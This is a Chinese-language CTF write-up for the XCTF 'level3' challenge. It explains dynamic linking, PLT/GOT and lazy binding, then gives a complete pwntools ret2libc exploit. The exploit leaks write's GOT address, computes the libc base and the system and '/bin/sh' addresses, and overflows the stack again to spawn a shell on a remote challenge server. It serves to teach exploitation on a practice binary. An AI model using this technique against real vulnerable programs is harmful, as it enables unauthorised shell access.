    最近学习了ret2libc，于是找了一道例题来练习：[xctf]level3 (opens new window)

    做题第一步，查看基本信息：

    发现只有NX保护和部分只读重定向（RELRO），根据题目提示，可以知道要利用ret2libc技巧 放入ida反汇编一下：

    可以发现，程序中已经没有现成的system函数和bin/sh地址了，但难道程序真的就没有他们俩了吗？

    # 动态链接

    实际上，linux采用了动态链接机制，即在程序运行时，当其需要使用时再去系统的动态链接库中调用，其调用过程即为（假设调用的是write函数）：

    需要调用write函数-->开始寻找write函数地址(即 call _write@plt）--> plt中没有，于是去.got.plt表中寻找(即 jmp .got.plt(write)) --> 找到write函数在程序中的地址

    其中：plt（Procedure Link Table）的是指程序连接表，而got（Global Offset Table）是指全局偏移量表，整个执行过程如图（网上找的）：

    但如果这样执行，got表就要把libc中所有函数的地址都保存下来，但其中大部分都是我们不需要的，这样会占用程序大量空间。于是，linux采用了延迟绑定机制，即当需要使用函数时，再去寻找该函数在程序中的位置。

    # 延迟绑定

    延迟绑定的机制分为两种情况，如果该函数已经被使用过了，那么got表中已经包含了该函数的地址，于是像上述过程进行即可。而如果这个函数还未被调用，则按如下过程进行：

    需要调用write函数-->开始寻找write函数地址(即 call _write@plt）--> plt中没有，于是去.got.plt表中寻找(即 jmp .got.plt(write)) --> 由于.got.plt表中没有，于是需要去寻找该write函数的地址

    # WP

    看完刚刚的过程后，我们进入ida，可以看到有一个名为vulnerable_function 的函数，从名字就可以看出这是我们要利用的。但当考虑栈溢出时，我们必须要先获得system函数和bin/sh的地址，于是，我们需要先让程序运行一下write（其他函数同理）并输出got表项，再减去got表中write地址的偏移，就可以获得libc的基地址。

    from pwn import *
## from LibcSearcher import *
context(log_level='debug',arch='i386', os='linux') 
pwnfile= '/image/level3'
## io = process(pwnfile)
io = remote('61.147.171.105', 51500)
elf = ELF(pwnfile)
libc = ELF("/image/libc_32.so.6")

padding = 0x8c #通过调试易得
leak_func_name = 'write'   #选择write函数来泄露其地址
leak_func_got = elf.got[leak_func_name]  #获取其got表项的地址

vulfunc_addr = elf.symbols['vulnerable_function']  
write_sys_addr = elf.symbols['write']
main_addr = elf.symbols['main']

#利用栈溢出，更改func的返回地址至write函数，并传入参数，执行结果相当于：write（1，write@got,8)
#main地址是为下一步做准备
payload = flat(b'a'*padding , write_sys_addr , main_addr , 1 , leak_func_got , 8 ) 

delimiter = "Input:\n"
io.sendlineafter(delimiter,payload)

write_addr = u32(io.recv(4))
print("write_addr:",hex(write_addr))

    在获得write函数的地址后，我们便可以轻松确定其他内容的地址。由于题目中给我们附带了libc的文件，所以我们可以直接查找，如果没有的话，我们可以通过libcsearcher查找。

    write_offset = libc.symbols["write"] #获取libc中write的偏移
libc_base = write_addr - write_offset #计算libc的基地址
print("libc:",hex(libc_base))

system_offset = libc.symbols["system"]  #同理计算system地址
system_addr = libc_base + system_offset
print("system:",hex(system_addr))

bin_sh_offset = 0x15902b  #bin_sh的偏移可以通过string命令查询，也可以用ida反汇编找到
bin_sh_addr = libc_base + bin_sh_offset
print("bin_sh:",hex(bin_sh_addr))

    最后，因为我们在前面设置了main的返回地址，所以程序在输出write函数地址后会回到main函数，这次再进行栈溢出就可以了：

    #简单的构造payload
payload2 = flat (b"a"*padding , system_addr , 0xdeadbeef , bin_sh_addr)

io.sendlineafter(delimiter, payload2)
io.interactive()
